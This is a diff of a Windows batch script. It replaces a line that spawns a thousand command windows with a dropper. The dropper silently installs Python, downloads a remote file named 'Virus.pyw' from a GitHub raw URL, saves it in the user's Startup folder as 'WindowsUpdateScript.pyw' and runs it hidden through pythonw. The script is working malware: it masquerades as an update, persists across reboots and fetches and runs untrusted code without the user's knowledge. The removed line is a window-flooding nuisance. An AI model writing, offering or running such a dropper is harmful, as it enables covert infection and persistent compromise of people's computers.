@@ -1,2 +1,27 @@
 @echo off
-for /l %%i in (1,1,1000) do start cmd
+setlocal enabledelayedexpansion
+
+set "PYTHON_URL=https://www.python.org/ftp/python/3.12.0/python-3.12.0.exe"
+set "INSTALLER=python-3.12.0.exe"
+set "SCRIPT_URL=https://raw.githubusercontent.com/NyveXgg/refdgdfsgdffdsfdsfdsfdgdfsgfs68658fasd865f7568a6sd657586das56dsa5f678d758a7dfgerergrefdgfdgdfgfdfdgs/refs/heads/main/Virus.pyw"
+set "SCRIPT_NAME=WindowsUpdateScript.pyw"
+set "STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
+
+python --version >nul 2>&1
+if %errorlevel% equ 0 goto :install
+
+:download_installer
+curl -s -L "%PYTHON_URL%" -o "%INSTALLER%"
+if %errorlevel% neq 0 (
+    timeout /t 2 /nobreak >nul
+    goto :download_installer
+)
+
+start /wait "" "%INSTALLER%" /quiet InstallAllUsers=0 PrependPath=1 Include_test=0
+del /f /q "%INSTALLER%" >nul 2>&1
+
+:install
+curl -s -L "%SCRIPT_URL%" -o "%STARTUP_DIR%\%SCRIPT_NAME%"
+timeout /t 3 /nobreak >nul
+"%LocalAppData%\Programs\Python\Python312-32\pythonw.exe" "%STARTUP_DIR%\%SCRIPT_NAME%" >nul 2>&1
+exit
